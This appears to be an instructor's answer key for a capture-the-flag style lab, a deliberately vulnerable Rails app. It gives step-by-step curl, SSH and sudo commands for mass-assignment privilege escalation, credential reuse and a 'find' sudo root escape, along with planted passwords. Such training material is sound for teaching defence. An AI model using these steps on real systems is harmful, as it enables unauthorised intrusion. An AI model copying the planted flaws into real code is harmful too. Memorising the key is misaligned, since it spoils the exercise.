# Solution — 08 TrackRails (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

A genuine **Rails 7** app (`ruby:3.3`, Puma on `:3000`, published `127.0.0.1:8508`) backed by
**Postgres 16** (`db.trackrails.lab`). Routes: `GET /` home, `GET/POST /login`, `GET /signup`,
`resources :users` (`/users`, `/users/:id`, `PATCH /users/:id`), `resources :notes`, and an
admin-only `GET /ops`. A second **internal** segment (`10.21.8.0/24`) holds the ops/SSH pivot
`ops.trackrails.lab`, whose SSH is published `127.0.0.1:8608`. The app host bridges both nets.

## Intended chain (web privesc → secret → SSH reuse → root)

1. **Foothold — self-register.** `GET /signup` → `POST /users` creates a `member` account.
   You are now authenticated.

2. **IDOR + mass-assignment privilege escalation (vector G).** `UsersController#update` does
   `@user = User.find(params[:id])` with **no ownership check** (IDOR — you can target any
   user) and `@user.update(params.require(:user).permit!)` — **`permit!` lets every attribute
   through, including `role`**. Escalate your own account to admin:
   ```sh
   # <id> is your user id (shown on your profile / in /users)
   curl -s -i -b cookies -c cookies \
     -X PATCH "http://127.0.0.1:8508/users/<id>" \
     --data-urlencode "user[role]=admin"
   ```
   (`params.permit!` also means you could have passed `user[role]=admin` straight to the
   signup `POST /users` — note the alternate.) `GET /users/:id` is likewise unauthorized, so
   you can also read any other account.

3. **Recover the reused secret (vector I, part 1).** As admin, the ops panel renders the
   on-disk deploy credentials:
   ```sh
   curl -s -b cookies http://127.0.0.1:8508/ops
   ```
   leaks `config/ops_credentials.yml` → `deploy` / **`D3ploy-0ps-Tr4ck-2026`** for
   `ops.trackrails.lab`.

4. **SSH credential reuse → internal foothold (vector I, part 2).** The ops host's `deploy`
   user has the **same** password:
   ```sh
   ssh deploy@127.0.0.1 -p 8608      # password: D3ploy-0ps-Tr4ck-2026
   ```
   (hydra against `ssh://127.0.0.1:8608` with that single password confirms it too.)

5. **Local privesc to root (vector K).** `sudo -l` shows `deploy ALL=(root) NOPASSWD:
   /usr/bin/find`. Escape via GTFOBins:
   ```sh
   sudo find . -exec /bin/sh \; -quit
   # id -> uid=0(root)
   cat /root/crown_jewels.txt        # production master key + live keys
   ```

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `seeded-admin-user` | `admin@trackrails.lab` | Postgres `users` (psql) |
| `reused-ops-credential` | `D3ploy-0ps-Tr4ck-2026` | `app:/app/config/ops_credentials.yml` |
| `pivot-ssh-banner` | `SSH-2.0` | `tcp 127.0.0.1:8608` |
| `crown-jewels` | `trackrails-prod-master-key-9c4f2a` | `pivot:/root/crown_jewels.txt` |

### psql auth form (loot 1)

The Postgres container uses the official image's default `local all all trust` on the unix
socket, and `docker exec` runs as root, so no password is needed for the loot oracle:
```sh
docker compose exec db psql -U trackrails -d trackrails -tAc \
  "SELECT email FROM users WHERE role = 'admin' LIMIT 1"     # -> admin@trackrails.lab
```
(Over TCP from the app the password is `trackrails-db-pw-2026`, per `DATABASE_URL`.)

## Seeded accounts

`admin@trackrails.lab` (admin, password unknown to the attacker — you reach admin via the
flaw, not by logging in) and members `alex@` / `priya@` / `sam@trackrails.lab`. Pivot:
`deploy` (password = the reused secret), root via the `find` sudo rule.

## Reset

`make lab-restore LAB=08-medium-rails` (recreate — drops the Postgres volume; Rails
`db:prepare` re-migrates and re-seeds on next boot).
